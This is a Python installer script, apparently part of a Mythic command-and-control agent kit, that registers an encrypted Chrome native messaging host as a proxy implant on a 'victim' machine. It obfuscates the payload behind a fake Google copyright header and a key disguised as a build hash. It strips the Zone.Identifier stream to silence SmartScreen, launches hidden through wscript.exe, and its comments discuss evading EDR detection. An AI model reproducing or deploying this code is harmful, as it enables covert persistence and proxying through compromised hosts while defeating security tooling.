#!/usr/bin/env python3
"""
proxy_install.py — register the IP proxy native messaging host with Chrome

Registers proxy_host.py (the encrypted bootstrap) as a Chrome native messaging
host so that ip_proxy_start can connect to it.  No elevation required.
Only --extension-id is required; everything else is auto-detected.

The PSK was baked into proxy_host.py at Mythic payload build time and is shown
in the Mythic build output.  It is NOT printed here and does not need to be
supplied to this script.

What this script does
---------------------
macOS / Linux
  1. Writes the manifest JSON to the Chrome NativeMessagingHosts directory.
  2. chmod +x proxy_host.py so Chrome can execute it via the shebang line.

Windows
  1. Checks for a .py file association (HKEY_CLASSES_ROOT\\Python.File).
     Found  -> manifest points directly to proxy_host.py (ShellExecuteEx).
     Missing -> creates proxy_host.bat wrapper, manifest points to the .bat.
  2. Writes the manifest JSON alongside proxy_host.py.
  3. Registers HKCU\\Software\\Google\\Chrome\\NativeMessagingHosts\\com.socks5_proxy.

Encryption modes (set in Mythic payload builder as "Proxy Encryption")
-----------------------------------------------------------------------
standard / high  (default)
  Mythic pre-encrypts proxy_host_core.py at build time.
  The zip contains proxy_host.py (encrypted bootstrap) + this installer.
  This script detects proxy_host.py, skips encryption, registers the manifest.
  PSK -> copy from the Mythic build output before running ip_proxy_start.

none
  The zip contains proxy_host_core.py (plaintext source) + this installer.
  This script encrypts it -> proxy_host.py, deletes the plaintext core,
  and prints the PSK at the end of its output.

Usage:
    python3 proxy_install.py --extension-id <32-char-ext-id>
    python3 proxy_install.py --extension-id <id> --python /path/to/python3
    python3 proxy_install.py --extension-id <id> --uninstall
"""

import argparse
import base64
import hashlib
import json
import os
import platform
import secrets
import struct
import sys
import zlib

HOST_NAME  = "IP_PROXY_HOST_PLACEHOLDER"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CORE_PY    = os.path.join(SCRIPT_DIR, "proxy_host_core.py")
HOST_PY    = os.path.join(SCRIPT_DIR, "IP_PROXY_SCRIPT_PLACEHOLDER")


# ── Encryption (SHA-256 CTR — no external deps) ───────────────────────────────

def _xctr(key: bytes, data: bytes) -> bytes:
    out = bytearray()
    for i in range(0, len(data), 32):
        ks    = hashlib.sha256(key + struct.pack('<Q', i // 32)).digest()
        block = data[i:i + 32]
        out  += bytes(a ^ b for a, b in zip(block, ks))
    return bytes(out)


# ── Bootstrap generator ───────────────────────────────────────────────────────

def _make_bootstrap(core_path: str):
    """Encrypt proxy_host_core.py. Returns (bootstrap_source, psk)."""
    with open(core_path, 'r') as f:
        src = f.read()

    key = secrets.token_bytes(32)
    psk = secrets.token_hex(16)           # 32 hex chars

    src = src.replace('"!!PSK!!"', '"' + psk + '"', 1)

    raw  = zlib.compress(src.encode('utf-8'), level=9)
    blob = _xctr(key, raw)
    b64  = base64.b64encode(blob).decode()

    # Key as four 8-byte bytes literals (looks like a build hash)
    key_lines = '\n'.join('    ' + repr(key[i:i + 8]) for i in range(0, 32, 8))

    # Payload split into 76-char chunks (implicit string concatenation)
    chunks   = [b64[i:i + 76] for i in range(0, len(b64), 76)]
    b64_body = '\n    '.join("'" + c + "'" for c in chunks)

    bootstrap = (
        "#!/usr/bin/env python3\n"
        "# Copyright (c) 2024 Google LLC\n"
        "# Chrome Extension Native Host v2.1.4\n"
        "import sys, zlib, base64 as _b, hashlib as _h, struct as _st\n"
        "\n"
        "_K = (\n"
        + key_lines + "\n"
        ")\n"
        "_P = _b.b64decode(\n"
        "    " + b64_body + "\n"
        ")\n"
        "\n"
        "def _dc(k, d):\n"
        "    r = bytearray()\n"
        "    for i in range(0, len(d), 32):\n"
        "        r += bytes(a ^ b for a, b in zip(\n"
        "            d[i:i+32], _h.sha256(k + _st.pack('<Q', i // 32)).digest()))\n"
        "    return bytes(r)\n"
        "\n"
        "if __name__ == '__main__':\n"
        "    exec(zlib.decompress(_dc(_K, _P)).decode(),\n"
        "         {'__name__': '__main__', '__file__': __file__})\n"
    )
    return bootstrap, psk


# ── Platform helpers ──────────────────────────────────────────────────────────

_STORE_STUB_MARKER = "WindowsApps"   # path fragment that identifies the Store stub

def _is_store_stub(path: str) -> bool:
    """Return True if path is the Windows Store Python stub, not a real interpreter."""
    return _STORE_STUB_MARKER in path.replace("\\", "/")

def find_python():
    import shutil

    candidates = []

    # On Windows, also search common install locations in case PATH is incomplete
    if platform.system() == "Windows":
        import glob
        local = os.path.expanduser("~/AppData/Local/Programs/Python")
        # Python3XX directories, newest first
        for d in sorted(glob.glob(os.path.join(local, "Python3*")), reverse=True):
            exe = os.path.join(d, "python.exe")
            if os.path.isfile(exe):
                candidates.append(exe)
        # System-wide installs
        for root in (r"C:\Python3*", r"C:\Program Files\Python3*",
                     r"C:\Program Files (x86)\Python3*"):
            for d in sorted(glob.glob(root), reverse=True):
                exe = os.path.join(d, "python.exe")
                if os.path.isfile(exe):
                    candidates.append(exe)

    # PATH-based lookup
    for name in ("python3", "python", "python3.exe", "python.exe"):
        p = shutil.which(name)
        if p:
            candidates.append(p)

    candidates.append(sys.executable)

    store_seen = False
    for p in candidates:
        if _is_store_stub(p):
            store_seen = True
            continue   # skip the stub, keep searching
        # Quick sanity: can we actually execute it?
        try:
            import subprocess
            r = subprocess.run([p, "--version"], capture_output=True, timeout=5)
            if r.returncode == 0:
                return p
        except Exception:
            continue

    # Nothing real found — fall back to sys.executable and warn loudly
    fallback = sys.executable
    if store_seen or _is_store_stub(fallback):
        print(
            "\n[!] WARNING: Only the Windows Store Python stub was found.\n"
            "    The stub (WindowsApps\\python3.exe) is NOT a real interpreter.\n"
            "    Chrome will silently fail to start the native host.\n"
            "\n"
            "    Install Python from https://www.python.org/downloads/ then\n"
            "    re-run with the --python flag, e.g.:\n"
            r"    python install.py --extension-id <id> "
            r'--python "C:\Users\<you>\AppData\Local\Programs\Python\Python312\python.exe"'
            "\n"
        )
    return fallback


def manifest_path_unix():
    s = platform.system()
    if s == "Darwin":
        d = os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/NativeMessagingHosts")
    else:
        d = os.path.expanduser("~/.config/google-chrome/NativeMessagingHosts")
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, f"{HOST_NAME}.json")


def _fix_shebang(host_path: str, python_path: str) -> None:
    """Rewrite the shebang in host_path to use the absolute Python path.

    Chrome launches native hosts with a stripped PATH that misses Homebrew.
    Using a bash wrapper adds an extra shell process and an extra file on disk.
    Embedding the absolute Python path in the shebang is cleaner and quieter:
    Chrome → python3  instead of  Chrome → bash → python3.
    """
    with open(host_path, 'r', errors='replace') as f:
        content = f.read()
    # Replace any generic shebang with the absolute python path
    import re as _re
    content = _re.sub(r'^#!.*\n', f'#!{python_path}\n', content, count=1)
    with open(host_path, 'w') as f:
        f.write(content)
    os.chmod(host_path, 0o755)


def write_manifest_unix(host_path, ext_id, python_path):
    _fix_shebang(host_path, python_path)
    manifest = {
        "name":            HOST_NAME,
        "description":     "Chrome helper service",
        "path":            host_path,
        "type":            "stdio",
        "allowed_origins": [f"chrome-extension://{ext_id}/"]
    }
    p = manifest_path_unix()
    with open(p, "w") as f:
        json.dump(manifest, f, indent=2)
    print(f"[+] Manifest : {p}")
    return p


def _py_file_is_executable_on_windows():
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r"Python.File\shell\open\command") as k:
            cmd, _ = winreg.QueryValueEx(k, "")
            return bool(cmd)
    except Exception:
        return False


def write_manifest_windows(host_path, ext_id, python_path):
    # Chrome uses CreateProcess(), not ShellExecute(), so .py files cannot be
    # run directly — an intermediate launcher is required to pass python_path
    # and the script path as arguments.
    #
    # Ideal (pre-compiled Go launcher shipped in ZIP):
    #   Chrome → launcher.exe → python.exe (signed)
    #   No compilation on victim. Launcher reads python path from launcher.cfg.
    #   Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o launcher.exe
    #
    # Current fallback (VBScript):
    #   Chrome → wscript.exe → python.exe (signed)
    #   Avoids cmd.exe. wscript.exe is common in enterprise environments.
    #   NOTE: do NOT use csc.exe to compile on-the-fly — that is a LOLbin
    #   abuse pattern that EDR vendors flag explicitly.

    script_name = os.path.basename(host_path)
    script_dir  = os.path.dirname(host_path)
    base_name   = os.path.splitext(script_name)[0]

    # Check for a pre-built Go launcher shipped alongside install.py in the ZIP.
    # The name is randomised at build time so we search for any .exe in the dir.
    import glob as _glob
    exe_candidates = [f for f in _glob.glob(os.path.join(script_dir, "*.exe"))
                      if os.path.basename(f).lower() not in ("python.exe", "pythonw.exe")]
    prebuilt_exe = exe_candidates[0] if exe_candidates else None
    if prebuilt_exe:
        # Write config file that the launcher reads at runtime
        cfg_path = os.path.join(script_dir, "launcher.cfg")
        with open(cfg_path, "w") as f:
            f.write(f"python={python_path}\r\n")
            f.write(f"script={script_name}\r\n")

        # Remove Zone.Identifier ADS — Windows marks files extracted from
        # ZIPs as "downloaded from internet" which triggers SmartScreen on
        # first run of any unsigned executable. Deleting the ADS suppresses
        # the prompt entirely. Silent no-op if the stream doesn't exist.
        for ads_target in (prebuilt_exe, cfg_path):
            try:
                os.remove(ads_target + ':Zone.Identifier')
            except Exception:
                pass

        exec_path = prebuilt_exe
        print(f"[+] Launcher : {prebuilt_exe}  (pre-compiled Go launcher)")
        print(f"    Config   : {cfg_path}")
        print(f"    Process tree: Chrome → launcher.exe → python.exe (signed)")
    else:
        # VBScript fallback — wscript.exe instead of cmd.exe
        vbs_path = os.path.join(script_dir, base_name + ".vbs")
        vbs_content = (
            'Dim objShell\r\n'
            'Set objShell = CreateObject("WScript.Shell")\r\n'
            'Dim scriptDir\r\n'
            'scriptDir = Left(WScript.ScriptFullName, '
            'InStrRev(WScript.ScriptFullName, "\\"))\r\n'
            f'Dim pyExe : pyExe = "{python_path}"\r\n'
            f'Dim pyScript : pyScript = scriptDir & "{script_name}"\r\n'
            'objShell.Run Chr(34) & pyExe & Chr(34) & " " & '
            'Chr(34) & pyScript & Chr(34), 0, False\r\n'
        )
        with open(vbs_path, "w") as f:
            f.write(vbs_content)
        exec_path = vbs_path
        print(f"[+] Launcher : {vbs_path}  (wscript.exe; no launcher.exe found in ZIP)")
        print(f"    Process tree: Chrome → wscript.exe → python.exe (signed)")

    json_path = os.path.join(os.path.dirname(host_path), f"{HOST_NAME}.json")
    manifest  = {
        "name":            HOST_NAME,
        "description":     "Chrome helper service",
        "path":            exec_path,
        "type":            "stdio",
        "allowed_origins": [f"chrome-extension://{ext_id}/"]
    }
    with open(json_path, "w") as f:
        json.dump(manifest, f, indent=2)
    print(f"[+] Manifest : {json_path}")

    import winreg
    reg_key = rf"SOFTWARE\Google\Chrome\NativeMessagingHosts\{HOST_NAME}"
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key) as k:
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, json_path)
    print(f"[+] Registry : HKCU\\{reg_key}")
    return json_path


def uninstall_unix():
    p = manifest_path_unix()
    if os.path.exists(p):
        os.unlink(p)
        print(f"[+] Removed  : {p}")
    else:
        print(f"[-] Not found: {p}")


def uninstall_windows():
    import winreg
    reg_key = rf"SOFTWARE\Google\Chrome\NativeMessagingHosts\{HOST_NAME}"
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_key)
        print(f"[+] Registry key removed: HKCU\\{reg_key}")
    except FileNotFoundError:
        print(f"[-] Registry key not found")
    for ext in (".exe", ".vbs", ".bat", ".cs"):   # remove whichever launcher was created
        launcher = os.path.join(SCRIPT_DIR,
                   os.path.splitext(os.path.basename(HOST_PY))[0] + ext)
        if os.path.exists(launcher):
            os.unlink(launcher)
            print(f"[+] Removed  : {launcher}")


# ── Main ──────────────────────────────────────────────────────────────────────

def install(args):
    python_path = args.python or find_python()
    system      = platform.system()

    psk = None
    if os.path.exists(CORE_PY):
        bootstrap, psk = _make_bootstrap(CORE_PY)
        with open(HOST_PY, 'w') as f:
            f.write(bootstrap)
        os.unlink(CORE_PY)
        print(f"[+] Encrypted: {HOST_PY}")
        print(f"[+] Removed  : {CORE_PY}")
    elif not os.path.exists(HOST_PY):
        print(f"[!] Neither proxy_host_core.py nor proxy_host.py found in: {SCRIPT_DIR}")
        sys.exit(1)
    else:
        print(f"[+] Bootstrap: {HOST_PY} (already encrypted)")
        print(f"[!] PSK not available — use the PSK from the original install")

    if system == "Windows":
        write_manifest_windows(HOST_PY, args.extension_id, python_path)
    else:
        # Embed absolute Python path in shebang; manifest points directly at HOST_PY.
        # Chrome → python3  (no shell wrapper in process tree).
        write_manifest_unix(HOST_PY, args.extension_id, python_path)

    print()
    print(f"[+] Python   : {python_path}")
    print(f"[+] Host     : {HOST_PY}")
    if psk:
        print()
        print(f"[!] PSK (shown once — save it now): {psk}")
        print(f"    Mythic: ip_proxy_start url=wss://<c2>/proxy-ws psk={psk}")
    print()
    print("Done.")


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--extension-id", required=True,
                   help="32-char Chrome extension ID (from Hades callback Domain field)")
    p.add_argument("--python", default=None,
                   help="Path to python interpreter (default: auto-detect)")
    p.add_argument("--uninstall", action="store_true")
    args = p.parse_args()

    if args.uninstall:
        if platform.system() == "Windows":
            uninstall_windows()
        else:
            uninstall_unix()
    else:
        install(args)


if __name__ == "__main__":
    main()
